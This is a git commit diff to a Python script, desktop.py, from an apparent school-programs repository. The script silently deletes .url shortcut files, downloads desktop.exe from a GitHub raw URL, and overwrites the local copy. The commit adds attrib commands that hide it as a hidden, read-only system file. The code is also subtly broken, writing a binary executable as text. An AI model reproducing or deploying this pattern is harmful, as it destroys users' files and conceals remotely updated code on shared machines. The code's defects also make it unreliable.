3574b6a765bece341bc5274bebf3207a7d0e3397
Kevie <65157770+thekevie@users.noreply.github.com>
2022-04-06 14:07:34 +0200

    Update desktop.py

--- desktop.py
+++ desktop.py
@@ -12,13 +12,14 @@ for dir in dirs:
     for file in files:
         if file.endswith(".url"):
             os.remove(os.path.join(dir, file))
-            print(f"deleted {file}")
 os.system("cls")
 
 try:
-    r = requests.get("https://raw.github.com/thekevie/school-programs/main/desktop.py")
+    r = requests.get("https://raw.github.com/thekevie/school-programs/main/desktop.exe")
 except Exception:
     exit
+    
+os.system("attrib -h -s -r desktop.exe")
 
 with open(path, "r") as f:
     read = f.read()
@@ -28,3 +29,5 @@ if not read == r.text:
     with open(path, "w") as f:
         f.write(r.text)
         f.close()
+        
+os.system("attrib +h +s +r desktop.exe")
